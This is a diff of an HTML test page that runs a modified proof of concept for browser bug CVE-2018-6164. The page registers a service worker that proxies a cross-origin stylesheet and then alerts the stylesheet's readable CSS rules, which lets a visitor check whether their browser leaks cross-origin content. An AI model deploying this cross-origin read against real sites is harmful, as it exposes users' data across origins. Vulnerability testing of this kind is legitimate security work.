@@ -51,35 +51,29 @@ audioCtx.audioWorklet.addModule('audi-work.js').then(() => {
 <h2>2. Modified POC for <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-6164">CVE-2018-6164</a></h2>
 <div>
 <p>Check whether your browser allows for css content to be readable even if it is cross-origin!<p>
-<p>Click on the button below, and watch out for an alert. Also, see if the text changes color.</p>
 </div>
-<br>
-
-<button onclick="style.display='none'; steal()">Steal some <i>style</i></button>
-<br>
-<br>
-<div class="crossOrigin">I am trying to steal some cross-origin styles!</div>
+<div class="crossOrigin" style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">I am trying to steal some cross-origin styles! Wahaha</div>
 <br>
 
 <div>
-<i class="fa">&#128077; Good: You do not see any alerts, and the text does not change color.</i>
+<i class="fa">&#128077; Good: The text does not change color.</i>
 <br>
-<i class="fa">&#128078; Bad: You see an alert, and the text became red.</i>
+<i class="fa">&#128078; Bad: The text is red.</i>
 </div>
 <br>
 
-<link rel="stylesheet" href="/catchme">
+<link rel="stylesheet" href="/catchme" onload="steal()">
 <script>
-  function steal() {
-    navigator.serviceWorker.register('/dysw.js?cors=no-cors&match=catchme&url=https://another-origin.firebaseapp.com/cross-origin.css')
-    .then(reg => {
-        // registration worked
-        console.log('Registration succeeded. Scope is ' + reg.scope);
-      }).catch(function(error) {
-        // registration failed
-        console.log('Registration failed with ' + error);
-    });
+  navigator.serviceWorker.register('/dysw.js?cors=no-cors&match=catchme&url=https://another-origin.firebaseapp.com/cross-origin.css')
+  .then(reg => {
+      // registration worked
+      console.log('Registration succeeded. Scope is ' + reg.scope);
+    }).catch(function(error) {
+      // registration failed
+      console.log('Registration failed with ' + error);
+  });
 
+  function steal() {
     alert(document.styleSheets[0].cssRules[0].cssText);
   }
 </script>
